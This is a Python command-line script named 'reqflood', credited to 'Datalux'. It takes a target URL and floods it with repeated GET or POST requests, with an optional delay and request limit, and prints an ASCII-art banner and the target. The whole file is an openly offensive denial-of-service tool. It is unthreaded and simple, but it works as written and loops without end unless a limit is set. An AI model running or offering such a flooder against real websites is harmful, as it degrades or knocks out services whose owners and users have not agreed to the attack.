#!/usr/bin/env python3

import argparse
from time import sleep
import sys
import requests

requests_counter = 0
time = 0
_url = ""

parser = argparse.ArgumentParser(description="./main.py -u [url]")
parser.add_argument('-u', '--url',  help="HTTP requests to flood", action="store", dest="url")
parser.add_argument('-P', '--post', help="Send POST request (default is GET)", action="store_true")
parser.add_argument('-d', '--delay', help="Delay (in seconds) between requests", action="store", dest="time", type=int)
parser.add_argument('-l', '--limit', help="Send only passed number requests", action="store", dest="limit", type=int)

args = parser.parse_args()

if not args.url:
    print("Error. Usage: ./main.py -u [url])")
    sys.exit()
else:
    if (args.url.find("http")) == -1:
        _url = "http://" + args.url
    elif (args.url.find("http")) == 0:
        _url = args.url

if args.time:
    if args.time > 0:
        time = args.time
    else:
        print("Error. Delay must be greater than 0.")
        sys.exit()



print('\033[36m' + '\033[1m' + "                  __ _                 _ " + '\033[0m')
print('\033[36m' + '\033[1m' + "                 / _| |               | |" + '\033[0m')
print('\033[36m' + '\033[1m' + "  _ __ ___  __ _| |_| | ___   ___   __| |" + '\033[0m')
print('\033[36m' + '\033[1m' + " | '__/ _ \\/ _` |  _| |/ _ \\ / _ \\ / _` |" + '\033[0m')
print('\033[36m' + '\033[1m' + " | | |  __/ (_| | | | | (_) | (_) | (_| |" + '\033[0m')
print('\033[36m' + '\033[1m' + " |_|  \\___|\\__, |_| |_|\\___/ \\___/ \\__,_|" + '\033[0m')
print('\033[36m' + '\033[1m' + "              | |                        " + '\033[0m')
print('\033[36m' + '\033[1m' + "              |_|                        " + '\033[0m')

print('\033[93m' + '\033[1m' + "\n     ..--|| Created by Datalux ||--..\n"  + '\033[0m')
print('\033[1m' + '\033[91m' + "Target url: " + '\033[0m' + '\033[1m' + _url + '\033[0m' + "\n")


while True:
    if requests_counter == args.limit:
        break

    if args.post:
        requests.post(_url)
    else:
        requests.get(_url)
    requests_counter += 1
    print("Sended " + str(requests_counter) + " requests")

    if time > 0:
        sleep(time)
